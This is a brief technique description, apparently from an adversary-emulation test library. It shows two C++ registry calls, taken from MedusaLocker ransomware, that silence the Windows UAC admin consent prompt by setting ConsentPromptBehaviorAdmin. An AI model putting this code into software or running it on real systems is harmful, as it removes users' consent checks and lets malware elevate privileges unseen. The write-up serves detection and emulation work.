This TTP is used to disable UAC prompt in the victim system and has been extracted from MedusaLocker Ransomware. It modifies registry keys to disable UAC prompt. It requires **Admin privileges** to disable the UAC on the system. Once the testcase has successfully been executed, every process can be opened as admin without the admin prompt shown on the screen.

The test case doesn't necessarily disable UAC. But only disables the prompt, which means that the malware can open any process as admin without any consent from user and can easily elevate privileges.

#### Open the registry key
```c++
RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey);
```
#### Change the value
```c++
RegSetValueEx(hKey, L"ConsentPromptBehaviorAdmin", 0, REG_DWORD, (LPBYTE)&value, sizeof(DWORD));
```
